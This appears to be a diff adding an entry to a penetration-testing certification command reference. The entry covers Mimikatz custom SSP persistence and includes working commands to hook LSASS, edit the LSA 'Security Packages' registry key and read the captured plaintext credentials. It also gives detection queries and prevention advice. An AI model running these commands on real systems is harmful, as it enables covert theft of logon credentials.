@@ -1,0 +1,89 @@
+{
+  "id": "ad-custom-ssp",
+  "name": "Custom SSP - Security Support Provider Persistence",
+  "command": "mimikatz # misc::memssp",
+  "description": "A Custom Security Support Provider (SSP) hooks into LSASS to capture plaintext credentials at every logon. mimilib.dll (shipped with Mimikatz) is the classic SSP that logs all credentials to C:\\Windows\\System32\\kiwissp.log. Can be installed via registry (survives reboot) or in-memory (fileless, lost on reboot).",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP persistence module; Mimikatz misc::memssp",
+  "tags": [
+    "ssp",
+    "security-support-provider",
+    "persistence",
+    "mimikatz",
+    "lsass",
+    "credential-capture",
+    "mimilib"
+  ],
+  "mitre": [
+    "T1547.005"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nSSPs are DLLs that plug into LSASS and handle authentication.\nBy registering a custom SSP (like mimilib.dll), you capture\nall plaintext credentials at logon time.\n\n=== METHOD 1: In-Memory (fileless, lost on reboot) ===\n  mimikatz # privilege::debug\n  mimikatz # misc::memssp\n  # All future logons logged to C:\\Windows\\System32\\mimilsa.log\n  # No DLL on disk, no registry change\n\n=== METHOD 2: Registry Persistence (survives reboot) ===\n  # Copy mimilib.dll to System32\n  copy mimilib.dll C:\\Windows\\System32\\\n\n  # Add to SSP list in registry\n  reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f\n\n  # After reboot: credentials logged to C:\\Windows\\System32\\kiwissp.log\n\n=== METHOD 3: PowerShell (AddSecurityPackage API) ===\n  # Requires mimilib.dll in System32\n  $packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"Security Packages\"\n  $packages.\"Security Packages\" += \"mimilib\"\n  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"Security Packages\" -Value $packages.\"Security Packages\"\n\n=== READ CAPTURED CREDS ===\n  type C:\\Windows\\System32\\kiwissp.log\n  type C:\\Windows\\System32\\mimilsa.log\n\n=== CLEANUP ===\n  # Remove from registry\n  # Delete mimilib.dll from System32\n  # Restart to unload from memory",
+  "examples": [
+    {
+      "label": "In-memory SSP (fileless)",
+      "command": "mimikatz.exe \"privilege::debug\" \"misc::memssp\" exit"
+    },
+    {
+      "label": "Registry-based persistence",
+      "command": "copy mimilib.dll C:\\Windows\\System32\\ && reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f"
+    },
+    {
+      "label": "Read captured credentials",
+      "command": "type C:\\Windows\\System32\\kiwissp.log"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE T1547.005 - SSP",
+      "url": "https://attack.mitre.org/techniques/T1547/005/"
+    },
+    {
+      "title": "Mimikatz - misc::memssp",
+      "url": "https://github.com/gentilkiwi/mimikatz/wiki"
+    }
+  ],
+  "defense": {
+    "why_it_works": "LSASS loads all registered SSPs and calls their SpAcceptCredentials function on each logon, passing plaintext credentials. A malicious SSP simply logs these to a file.",
+    "prerequisites": "Local administrator or SYSTEM access on the target (to modify LSASS or registry).",
+    "impact": "All future logon credentials captured in plaintext - including domain admin and service accounts.",
+    "detection": "[MITRE T1547.005] Changes to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages; unknown DLLs loaded into lsass.exe; mimilib.dll or kiwissp.log on disk.",
+    "artifacts": "Registry modification (Event 4657); DLL loaded into LSASS (Sysmon Event 7); kiwissp.log or mimilsa.log file creation.",
+    "splunk_spl": "index=sysmon EventCode=7 Image=\"*lsass.exe\"\n| where NOT match(ImageLoaded, \"(msv1_0|kerberos|schannel|wdigest|tspkg|pku2u|cloudAP)\\.dll$\")\n| table _time, Image, ImageLoaded, Hashes",
+    "elastic_kql": "event.code:\"7\" AND process.name:\"lsass.exe\" AND NOT dll.name:(msv1_0.dll OR kerberos.dll OR schannel.dll OR wdigest.dll)",
+    "sentinel_kql": "SysmonEvent\n| where EventID == 7 and Image endswith \"lsass.exe\"\n| where ImageLoaded !contains \"msv1_0\" and ImageLoaded !contains \"kerberos\" and ImageLoaded !contains \"schannel\"\n| project TimeGenerated, Image, ImageLoaded, Hashes",
+    "sigma_rules": "sysmon_lsass_unknown_dll_load",
+    "prevention": "Monitor LSASS module loads (Sysmon Event 7); protect LSASS with Credential Guard; monitor LSA Security Packages registry key; restrict write access to System32.",
+    "sources": [
+      "CRTP persistence module",
+      "https://attack.mitre.org/techniques/T1547/005/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Custom SSP - Unknown DLL loaded into LSASS",
+        "logic": "SysmonEvent\n| where EventID == 7 and Image endswith \"lsass.exe\"\n| where ImageLoaded !has_any (\"msv1_0\",\"kerberos\",\"schannel\",\"wdigest\",\"tspkg\",\"pku2u\",\"cloudAP\",\"livessp\",\"negoexts\")\n| project TimeGenerated, Image, ImageLoaded, Hashes, SignatureStatus",
+        "data_source": "sysmon",
+        "log_ids": [
+          "7"
+        ],
+        "attack": [
+          "T1547.005"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Third-party SSPs (smart card, MFA providers)",
+        "tuning": "Whitelist known legitimate SSP DLLs; alert on unsigned DLLs"
+      }
+    ]
+  }
+}
